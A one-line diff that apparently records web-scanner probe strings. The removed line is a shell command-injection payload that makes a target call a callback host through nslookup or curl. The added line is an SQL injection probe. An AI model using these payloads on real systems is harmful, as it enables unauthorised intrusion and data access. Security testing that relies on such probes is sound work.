@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitpblfnbkmhb88429.bxss.me||curl hitpblfnbkmhb88429.bxss.me)
+-1" OR 2+534-534-1=0+0+0+1 -- 
